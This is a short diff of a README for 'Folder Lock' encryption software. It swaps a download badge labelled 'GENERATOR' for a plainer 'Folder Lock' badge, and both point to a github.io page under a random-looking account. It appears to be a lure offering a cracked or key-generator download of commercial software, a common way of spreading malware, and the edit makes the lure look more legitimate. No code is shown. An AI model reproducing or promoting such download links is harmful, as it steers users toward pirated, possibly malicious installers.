@@ -6,7 +6,7 @@
      alt="Folder Lock Folder Encryption Interface" 
      style="width: 100%; height: auto; display: block;">
 
-[![Get Software](https://img.shields.io/badge/⬇️_Folder_Lock_GENERATOR-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://iovsyukova996.github.io/.github/folder-lock-folder)
+[![Get Software](https://img.shields.io/badge/⚡_Folder_Lock-0D1117?style=for-the-badge&logo=githubactions&logoColor=white)](https://iovsyukova996.github.io/.github/folder-lock-folder)
 
 ---
 
